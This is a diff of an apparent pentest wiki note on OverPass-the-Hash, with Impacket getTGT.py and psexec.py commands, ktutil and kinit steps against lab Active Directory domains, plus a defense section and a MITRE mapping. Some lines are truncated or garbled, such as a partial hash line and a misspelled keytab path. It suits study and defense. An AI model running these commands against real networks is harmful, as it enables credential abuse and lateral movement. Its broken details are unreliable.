@@ -37,6 +37,8 @@ OverPass-the-Hash is a technique used to authenticate to a remote system using N
 
 This procedure is commonly used by attackers to move laterally within a network and gain access to sensitive information or systems. From a technical perspective, this attack takes advantage of the way that Windows stores and uses NTLM hashes for authentication. From a business perspective, this attack can result in significant data breaches and financial losses.
 
+ 
+
 ## Requirements
 
 1. Valid credentials with NT hash available
@@ -44,6 +46,8 @@ This procedure is commonly used by attackers to move laterally within a network 
 1. Access to a system on the network
 
 1. Impacket library installed
+
+ 
 
 ## Defense
 
@@ -53,6 +57,8 @@ This procedure is commonly used by attackers to move laterally within a network 
 
 1. Monitor network traffic for signs of OverPass-the-Hash attacks, such as abnormal authentication attempts or unusual network traffic
 
+ 
+
 ## Objectives
 
 1. Retrieve a Kerberos TGT using the NT hash of a user's password
@@ -60,6 +66,8 @@ This procedure is commonly used by attackers to move laterally within a network 
 1. Authenticate to other systems using the TGT
 
 1. Move laterally within a network
+
+ 
 
 # Instructions
 
@@ -71,7 +79,13 @@ This procedure is commonly used by attackers to move laterally within a network 
 5. Use the TGT to obtain a ticket-granting ticket by running the command 'kinit -t <keytab file> <principal name>'.
 6. Verify the obtained TGT using the command 'klist'.
 
+ 
+
+
+
 **Code**: [[root@kali:~$ python ./getTGT.py -hashes ":1a59bd44]]
+
+
 
 > - The 'python ./getTGT.py -hashes ":<NT hash>" <domain name>' command is used to obtain a valid Kerberos ticket (TGT) using the NT hash of an account.
 - The 'python3 psexec.py "<target host>/<target user>@<domain>" -k -no-pass' command is used to authenticate with the target host using the obtained TGT.
@@ -80,11 +94,17 @@ This procedure is commonly used by attackers to move laterally within a network 
 - The 'kinit -t <keytab file> <principal name>' command is used to obtain a ticket-granting ticket using the obtained TGT.
 - The 'klist' command is used to verify the obtained TGT.
 
+
+
 **Command** ([[Get TGT using hash]]):
 
 ```bash
 python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
 ```
+
+
+
+
 
 **Command** ([[Authenticate using psexec.py]]):
 
@@ -92,11 +112,19 @@ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
 python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass
 ```
 
+
+
+
+
 **Command** ([[Get TGT using AES key]]):
 
 ```bash
 ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
 ```
+
+
+
+
 
 **Command** ([[Add TGT to keytab using ktutil]]):
 
@@ -104,17 +132,27 @@ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pas
 ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
 ```
 
+
+
+
+
 **Command** ([[Obtain ticket-granting ticket]]):
 
 ```bash
 kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
 ```
 
+
+
+
+
 **Command** ([[Verify TGT using klist]]):
 
 ```bash
 klist
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -140,3 +178,5 @@ klist
 - [[Active Directory Attacks]]
 - [[OverPass-the-Hash (pass the key)]]
 - [[Using impacket]]
+
+
